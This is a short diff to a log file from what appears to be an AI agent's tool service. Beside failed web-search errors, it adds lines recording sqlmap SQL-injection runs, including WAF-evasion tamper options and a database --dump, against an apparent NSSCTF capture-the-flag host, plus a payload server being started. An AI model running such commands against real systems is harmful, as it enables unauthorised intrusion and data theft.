@@ -286,3 +286,6 @@ Traceback (most recent call last):
 httpx.ConnectError: All connection attempts failed
 2026-04-13 19:05:16,803 - duckduckgo_search.DDGS - INFO - Error to search using bing backend: https://www.bing.com/search ConnectError: ('error sending request for url (https://www.bing.com/search?q=%E5%8C%97%E4%BA%AC+%E4%BB%8A%E6%97%A5+%E5%A4%A9%E6%B0%94)', 'https://www.bing.com/search?q=%E5%8C%97%E4%BA%AC+%E4%BB%8A%E6%97%A5+%E5%A4%A9%E6%B0%94')
 2026-04-13 19:05:16,804 - jaster.mcp.mcp_service - WARNING - web_search DDGS backend failed, falling back to HTML scraping: https://www.bing.com/search ConnectError: ('error sending request for url (https://www.bing.com/search?q=%E5%8C%97%E4%BA%AC+%E4%BB%8A%E6%97%A5+%E5%A4%A9%E6%B0%94)', 'https://www.bing.com/search?q=%E5%8C%97%E4%BA%AC+%E4%BB%8A%E6%97%A5+%E5%A4%A9%E6%B0%94')
+2026-04-13 21:57:13,857 - jaster.mcp.mcp_service - INFO - Executing sqlmap command: sqlmap -u http://node4.anna.nssctf.cn:26724/view.php?no=1 --batch --random-agent --level 2 --risk 1
+2026-04-13 21:57:27,266 - jaster.mcp.mcp_service - INFO - [PayloadServer] Started server ps_c2c10a1d on 0.0.0.0:18342
+2026-04-13 21:59:38,275 - jaster.mcp.mcp_service - INFO - Executing sqlmap command: sqlmap -u http://node4.anna.nssctf.cn:26724/view.php?no=1 --batch --random-agent --tamper space2comment,randomcase --level 2 --risk 2 --dbms mysql --batch --dump
